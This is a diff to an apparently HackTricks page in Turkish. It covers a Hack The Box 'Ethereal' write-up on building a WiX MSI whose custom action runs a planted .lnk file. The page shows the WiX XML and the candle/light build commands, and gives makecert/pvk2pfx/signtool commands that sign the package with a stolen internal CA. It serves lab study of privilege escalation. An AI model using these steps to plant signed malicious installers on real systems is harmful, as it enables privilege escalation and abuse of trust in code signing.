@@ -1,12 +1,12 @@
-# Kötü Amaçlı MSI Oluşturma ve Root Elde Etme
+# WiX ile Custom-Action MSI Oluşturma
 
 {{#include ../../banners/hacktricks-training.md}}
 
-MSI installer oluşturma işlemi wixtools kullanılarak gerçekleştirilecektir; özellikle [wixtools](http://wixtoolset.org) kullanılacaktır. Alternatif MSI builder'larının da denendiğini, ancak bu özel durumda başarılı olmadıklarını belirtmek gerekir.<sup>[[1]](#references)</sup>
+Bu tarihsel Hack The Box zincirinde, daha önce yerleştirilmiş bir `.lnk` dosyasını çalıştıran bir MSI oluşturmak için WiX Toolset v3 kullanılmıştır. **Bir MSI otomatik olarak privileged değildir**: Çalıştırma, Windows Installer policy, custom-action attributes ve kurulumu gerçekleştiren kişinin seçtiği bağlamda gerçekleşir. Belirtilen senaryoda attacker ayrıca trusted signing CA'yı çalmış ve signed MSI'ı başka bir user tarafından izlenen bir klasöre yerleştirmiştir.<sup>[[1]](#references)[[3]](#references)</sup>
 
-wix MSI kullanım örneklerini kapsamlı bir şekilde anlamak için [bu sayfaya](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) başvurulması tavsiye edilir. Burada, wix MSI kullanımını gösteren çeşitli örnekler bulabilirsiniz.<sup>[[2]](#references)</sup>
+WiX MSI kullanım örneklerini kapsamlı şekilde anlamak için [bu sayfaya](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) başvurmanız önerilir. Burada WiX MSI kullanımını gösteren çeşitli örnekler bulabilirsiniz.<sup>[[2]](#references)</sup>
 
-Amaç, lnk dosyasını çalıştıracak bir MSI oluşturmaktır. Bunu gerçekleştirmek için aşağıdaki XML kodu kullanılabilir ([xml buradan alınmıştır](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
+MSI, `C:\Users\Public\Desktop\Shortcuts\rick.lnk` dosyasını çalıştırır. Orijinal WiX v3 XML'i aşağıda korunmuştur:<sup>[[1]](#references)</sup>
 ```html
 <?xml version="1.0"?>
 <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
@@ -38,25 +38,31 @@ fail_here
 </Product>
 </Wix>
 ```
-Package elementinin, installer sürümünü belirten InstallerVersion ve package'in sıkıştırılmış olup olmadığını belirten Compressed gibi attribute'lar içerdiğini belirtmek önemlidir.
+`InstallerVersion`, minimum Windows Installer sürümünü belirtir ve `Compressed="yes"` paketin sıkıştırılmış olarak işaretlenmesini sağlar. `Stage1` ertelenmiştir ancak `Impersonate="yes"` değerine sahiptir; bu nedenle yüklemeyi gerçekleştiren kullanıcının taklit edilmiş token'ı ile çalışır. Bu senaryodaki yetki değişikliği, bu özniteliğin sihirli bir şekilde SYSTEM yetkisi vermesinden değil, daha sonra MSI'ı açan ayrıcalıklı kullanıcıdan kaynaklanmıştır.<sup>[[3]](#references)</sup>
 
-Oluşturma işlemi, msi.xml dosyasından bir wixobject oluşturmak için wixtools'tan bir tool olan candle.exe'nin kullanılmasını içerir. Aşağıdaki komut çalıştırılmalıdır:<sup>[[1]](#references)</sup>
+Kaynağı `candle.exe` ile bir WiX nesnesine derleyin:<sup>[[1]](#references)</sup>
 ```
-candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
+candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
 ```
-Ayrıca, gönderide komutu ve çıktısını gösteren bir görselin bulunduğunu belirtmek gerekir. Görsel rehberlik için bu görsele başvurabilirsiniz.<sup>[[1]](#references)</sup>
-
-Bunun yanı sıra, wixtools içindeki başka bir araç olan light.exe, wixobject'ten MSI dosyası oluşturmak için kullanılacaktır. Çalıştırılacak komut aşağıdaki gibidir:<sup>[[1]](#references)</sup>
+Bu nesneyi `light.exe` ile bir MSI'ye bağlayın:<sup>[[1]](#references)</sup>
 ```
-light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
+light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
 ```
-Önceki command'e benzer şekilde, command'i ve çıktısını gösteren bir görsel post'a eklenmiştir.<sup>[[1]](#references)</sup>
+### Orijinal zincirde kullanılan imzalama adımı
 
-Bu summary değerli bilgiler sağlamayı amaçlasa da daha kapsamlı ayrıntılar ve doğru talimatlar için original post'a başvurulması önerilir.<sup>[[1]](#references)</sup>
+Hedef workflow, ele geçirilmiş bir internal CA tarafından imzalanan paketleri kabul ediyordu. Teknik anlatımda, kurtarılan `MyCA.cer`/`MyCA.pvk` dosyalarından bir signing certificate türetildi, bir PFX oluşturuldu ve MSI imzalandı:<sup>[[1]](#references)</sup>
+```powershell
+makecert.exe -n "CN=Ethereal" -pe -cy end `
+-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
+-sv C:\tmp\rick.pvk C:\tmp\rick.cer
+pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
+signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
+```
+Saldırgan daha sonra imzalı paketi `D:\DEV\MSIs` konumuna yerleştirdi ve ayrıcalıklı workflow/kullanıcının paketi çalıştırmasını bekledi. Tekniği uyarlarken bu ön koşulu koruyun: yükseltilmiş bir installation path, `AlwaysInstallElevated` gibi güvenli olmayan bir policy veya ayrıcalıklı bir victim olmadan bu paket yalnızca mevcut kullanıcının haklarıyla çalışır.
 
-## Referanslar
+## References
 
-- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
-- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (ayrıca [wixtools](http://wixtoolset.org) adresine bakın)
-
+- [1] [Hack The Box - Ethereal: Kötü Amaçlı msi Oluşturma ve root Alma - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
+- [2] [Kısa bir giriş: WiX ile MSI installer oluşturma - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
+- [3] [Microsoft Learn — Ertelenmiş yürütme custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
 {{#include ../../banners/hacktricks-training.md}}
